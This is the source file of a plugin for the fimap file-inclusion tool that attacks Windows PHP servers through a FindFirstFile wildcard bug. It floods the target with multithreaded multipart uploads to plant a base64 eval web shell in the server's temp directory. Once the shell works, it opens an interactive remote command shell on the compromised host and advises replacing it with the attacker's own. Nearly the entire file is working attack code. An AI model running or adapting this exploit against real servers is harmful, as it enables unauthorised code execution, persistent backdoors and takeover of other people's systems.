from plugininterface import basePlugin

# Plugin by Iman Karim <fimap.dev@gmail.com>
# License: GPLv2

import urlparse, socket, threading, base64, urllib, string, random, time



class FindFirstFileAbuse(basePlugin):
    egg = "c:\\\\xampp\\\\tmp\\\\egg"
    remotetmpdir = "c:\\xampp\\tmp"
    
    maxAttempts = 5000
    maxThreads = 50
    
    def plugin_init(self):
        self.display = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(32))
        self.evalshell = "<?php $var=\"data\"; if (isset($var)){eval(base64_decode($_POST[$var]));} ?>"
        self.payload = "<?php $c=fopen('%s', 'w'); fwrite($c, '%s'); fclose($c); echo '%s' ?>" %(self.egg, self.evalshell, self.display)
        self.lotteryTicket = "phpA<tmp";
        
        self.FILE_DATA = "-----------------------------58239048594367238956\r\n"
        self.FILE_DATA += "Content-Disposition: form-data; name=\"datafile\"; filename=\"trash.txt\"\r\n"
        self.FILE_DATA += "Content-Type: text/plain\r\n"
        self.FILE_DATA += "\r\n"
        self.FILE_DATA += "%s\n" %(self.payload)
        self.FILE_DATA += "\r\n-----------------------------58239048594367238956--\r\n"
        
        self.HTTP_DATA  = "POST __PATH____POST__ HTTP/1.1\r\n"
        self.HTTP_DATA += "Host: __HOST__\r\n"
        #self.HTTP_DATA += "Cookie: \r\n" 
        self.HTTP_DATA += "HTTP_USER_AGENT: Firefox\r\n" #TODO: Implement real user agent.
        self.HTTP_DATA += "Content-Type: multipart/form-data; boundary=---------------------------58239048594367238956\r\n"
        self.HTTP_DATA += "Content-Length: %s\r\n" %str(len(self.FILE_DATA))
        self.HTTP_DATA += "\r\n"
        self.HTTP_DATA += self.FILE_DATA
        
        
        
        
        
    def plugin_loaded(self):
        # This function will be called if all plugins are loaded.
        pass
        
    def plugin_exploit_modes_requested(self, langClass, isSystem, isUnix):
        return([])
        
     
    def plugin_fallback_modes_requested(self, langClass):

        ret = []
        if (langClass.getName() == "PHP"):
            self.lang = langClass
            ret.append(("Launch FindFirstFile Glitch (Windows only)...", "FindFirstFileAbuse.hax"))

        return(ret)
        
    def plugin_callback_handler(self, callbackstring, haxhelper):
        if (callbackstring == "FindFirstFileAbuse.hax"):
            inp = -1
            
            while(inp != "q" and inp != "Q"):
                options = []
                
                urlDisplay = self.remotetmpdir
                
                if (urlDisplay == ""):
                    urlDisplay = "<None - Define one!>"
                
                options.append("1. Enter Path of TempDir")
                options.append("2. AutoProbe for TempDir")
                options.append("   Current TempDir: %s" %(urlDisplay))
                options.append("3. Change number of attempts (Current: %d)" %(self.maxAttempts))
                options.append("4. Change number of threads (Current: %d)" %(self.maxThreads))
                options.append("5. Change eggdrop location (Current: %s)" %(self.egg))
                options.append("6. Change your lottery ticket (Current: %s)" %(self.lotteryTicket))
                options.append("7. Launch attack")
                options.append("0. WTF is this shit?")
                options.append("q. Back to fimap")
                
                haxhelper.drawBox("FindFirstFile Glitch", options)
                inp = raw_input("Choose action: ")
                
                try:
                    idx = int(inp)
                    
                    if (idx == 1):
                        self.remotetmpdir = raw_input("Please type in the complete URL of the Remote Temporary Directory: ")
                        print "Remote Temporary Directory URL changed to: %s" %(self.remotetmpdir)
                    
                    elif (idx == 2):
                        print "AutoProbe not implemented right now :("
                        
                    elif (idx == 3):
                        tmp = raw_input("Please type in the number of attempts you wish: ")
                        try:
                            n = int(tmp)
                            if (n <= 0):
                                print "WTH. Zero or less attempts are not smart bro."
                            else:
                                self.maxAttempts = n
                                print "MaxAttempts changed to: %s" %(self.maxAttemps)
                        except:
                            print "Invalid number."
                        
                    elif (idx == 4):
                        tmp = raw_input("Please type in the number of threads you wish: ")
                        try:
                            n = int(tmp)
                            if (n <= 0):
                                print "WTH. Zero or less threads are not smart bro."
                            else:
                                self.maxThreads = n
                                print "MaxThreads changed to: %s" %(self.maxThreads)
                        except:
                            print "Invalid number."
                        
                    elif (idx == 5):
                        self.egg = raw_input("Please type location where to try to drop the egg.\nPlease no trailing '\\' :")
                        print "EggDrop location changed to: %s" %(self.egg)
                    
                    elif (idx == 6):
                        self.lotteryTicket = raw_input("Please type in your new lottery ticket: ")
                        print "LotteryTicket changed to: %s" %(self.lotteryTicket)
                    
                                        
                    elif(idx == 0):
                        print "This plugin uses a bug in the windows PHP versions which allows basicly to"
                        print "use jokers while including files."
                        print "You have to know the absolute path to the temporary directory where PHP"
                        print "will store its temporary files."
                        print "The plugin will then upload specially crafted files and tries to include"
                        print "them using your 'LotteryTicket' you can provide."
                        print "Your 'LotteryTicket' should contain a FindFirstFile compatible wildcard."
                        print "Print by default the 'LotteryTicket' is phpA<tmp which you can basicly translate to:"
                        print "'phpA*tmp'."
                        print "Once the plugin managed to exploit this vulnerability you will be prompted to the"
                        print "fimap lite shell which you should replace with your own shell asap."
                    
                    elif (idx == 7):
                        if (self.remotetmpdir != None and self.remotetmpdir != ""):
                            print "Launching attack..."
                            path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(self.remotetmpdir + "\\" + self.lotteryTicket)
                            
                            if (self.createEgg(haxhelper, path, postdata)):
                                # SUCCESSFULLY CREATED EVAL SHELL AT self.egg
                            
                                shell_banner = "fimap_eggshell> "
                                
                                lang = haxhelper.langClass
                                
                                quiz, answer = lang.generateQuiz()
                                #Since it's eval'd we remove the stuff...
                                quiz = quiz.replace("<?php", "")
                                quiz = quiz.replace("?>", "")
                                
                                path, postdata, header, trash = haxhelper.getHaxDataForCustomFile(self.egg)
                                
                                domain = urlparse.urlsplit(haxhelper.getURL())[1]
                                url = urlparse.urljoin("http://" + domain, path)
                                
                                post = ""
                                
                                if (postdata != ""):
                                    post = postdata + "&"
                                
                                post += urllib.urlencode({"data": base64.b64encode(quiz)})
                                res = haxhelper.doRequest(url, post, header)
                                
                                if (res.find(answer) != -1):
                                    print "PHP Code Injection thru EggDrop works!"
                                    xmlconfig = haxhelper.parent_codeinjector.config["XML2CONFIG"]
                                    shellquiz, shellanswer = xmlconfig.generateShellQuiz(haxhelper.isUnix())
                                    shell_test_code = shellquiz
                                    shell_test_result = shellanswer 
                                    for item in self.lang.getExecMethods():
                                        name = item.getName()
                                        payload = None
                                        if (item.isUnix() and haxhelper.isUnix()) or (item.isWindows() and haxhelper.isWindows()):
                                            self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
                                            code = item.generatePayload(shell_test_code)
                                            code = code.replace("<?php", "")
                                            code = code.replace("?>", "")
                                            testload = urllib.urlencode({"data": base64.b64encode(code)})
                                            
                                            if (postdata != ""):
                                                testload = "%s&%s" %(postdata, testload)
                                            code = self.doPostRequest(url, testload, header)
                                            
                                            if code != None and code.find(shell_test_result) != -1:
                                                working_shell = item
                                                self._log("Execution thru '%s' works!"%(name), self.LOG_ALWAYS)
                                                
                                                print "--------------------------------------------------------------------"
                                                print "Welcome to the fimap_eggshell!"
                                                print "This is a lite version of the fimap shell."
                                                print "Consider this shell as a temporary shell you should get rid of asap."
                                                print "Upload your own shell to be on the safe side."
                                                print "--------------------------------------------------------------------"  
                                                
                                                payload = raw_input(shell_banner)
                                                
                                                while (payload != "q" and payload != "Q"):
                                                    payload = item.generatePayload(payload)
                                                    payload = payload.replace("<?php", "")
                                                    payload = payload.replace("?>", "")
                                                    payload = urllib.urlencode({"data": base64.b64encode(payload)})
                                                    if (postdata != ""):
                                                        payload = "%s&%s" %(postdata, payload)
                                                    code = self.doPostRequest(url, payload, header)
                                                    print code
                                                    payload = raw_input(shell_banner)
                                                
                                                return
                                        else:
                                            self._log("Skipping execution method '%s'..."%(name), self.LOG_DEBUG)
                                else:
                                    print "PHP Code Injection thru EggDrop failed :("
                                    return
                            
                        else:
                            print "No Remote Temporary Directory defined."
                            
                except (ValueError):
                    pass
            
    def createEgg(self, haxhelper, path, postdata):
        host = urlparse.urlsplit(haxhelper.getURL())[1]
        
        runningThreads = []
        
        attempt = 1
        success = False
        while (attempt < self.maxAttempts or len(runningThreads) > 0):
            if (len(runningThreads) < self.maxThreads and attempt < self.maxAttempts):
                content = self.HTTP_DATA
                
                content = content.replace("__HOST__", host)
                content = content.replace("__PATH__", path)
                content = content.replace("__SIZE_OF_FILE__", str(len(self.payload)))
                content = content.replace("__FILE_CONTENT__", self.payload)
                if (postdata == None or postdata == ""):
                    content = content.replace("__POST__", "")
                else:
                    content = content.replace("__POST__", postdata + "&")
                    
                newThread = ProbeThread(host, 80, content, haxhelper, self.display)
                runningThreads.append(newThread)
                newThread.start()
                print "Thread Attempt %d started..." %(attempt)
                attempt+=1

            for probe in runningThreads:
                if (probe.finished):
                    runningThreads.remove(probe)
                    if probe.foundShell:
                        success = True

            if (success):
                break
            
        if (success):
            print "Egg dropped successfully!"
        
        print "Waiting for remaining threads to finish..."
        print "Hit CTRL+C to just kill the threads like an arse."
        try:
            while(len(runningThreads) > 0):
                    for t in runningThreads:
                        if t.finished:
                            runningThreads.remove(t)
                            
                            
        except KeyboardInterrupt:
            while(len(runningThreads) > 0):
                runningThreads.remove(0)
            print "Carelessly ignoring threads..."
        
        print "Finished."
        
        return(success)
                    
class ProbeThread(threading.Thread):
    def __init__(self, host, port, http_content, haxhelper, display):
        threading.Thread.__init__(self)
        self.finished = False
        self.foundShell = False
        self.host = host
        self.port = port
        self.content = http_content
        self.hax = haxhelper
        self.display = display
        
     
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #print "Connecting to %s:%s" %(self.host, self.port)
        try:
            sock.connect((self.host, self.port))
                    
            sock.send(self.content)
            sock.settimeout(1)
            receivedData = ""
            tmpData = ""
            while(True):
                time.sleep(0.1)
                try:
                    tmpData = sock.recv(4096)
                except:
                    continue
                if not tmpData: break;
                
                receivedData += tmpData
                
                if (receivedData.find(self.display) != -1):
                    self.foundShell = True
                    break
                if (tmpData == "") or tmpData.endswith("0\r\n\r\n"):
                    break               
        except:
            pass
        
        sock.close()
        self.finished = True
